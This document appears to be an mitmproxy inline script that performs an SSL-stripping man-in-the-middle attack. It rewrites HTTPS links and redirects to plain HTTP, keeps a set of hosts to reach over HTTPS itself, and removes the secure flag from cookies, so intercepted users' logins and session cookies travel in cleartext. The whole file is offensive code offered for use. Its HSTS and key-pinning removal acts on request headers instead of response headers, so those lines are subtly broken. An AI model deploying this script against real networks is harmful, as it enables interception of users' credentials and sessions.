from netlib.http import decoded
import re
from six.moves import urllib

def start(context, argv) :

    #set of SSL/TLS capable hosts
    context.secure_hosts = set()

def request(context, flow) :

    flow.request.headers.pop('If-Modified-Since', None)
    flow.request.headers.pop('Cache-Control', None)

    #proxy connections to SSL-enabled hosts
    if flow.request.pretty_host in context.secure_hosts :
        flow.request.scheme = 'https'
        flow.request.port = 443

def response(context, flow) :

    with decoded(flow.response) :
        flow.request.headers.pop('Strict-Transport-Security', None)
        flow.request.headers.pop('Public-Key-Pins', None)

        #strip links in response body
        flow.response.content = flow.response.content.replace('https://', 'http://')

        #strip links in 'Location' header
        if flow.response.headers.get('Location','').startswith('https://'):
            location = flow.response.headers['Location']
            hostname = urllib.parse.urlparse(location).hostname
            if hostname:
                context.secure_hosts.add(hostname)
            flow.response.headers['Location'] = location.replace('https://', 'http://', 1)

        #strip secure flag from 'Set-Cookie' headers
        cookies = flow.response.headers.get_all('Set-Cookie')
        cookies = [re.sub(r';\s*secure\s*', '', s) for s in cookies]
        flow.response.headers.set_all('Set-Cookie', cookies)
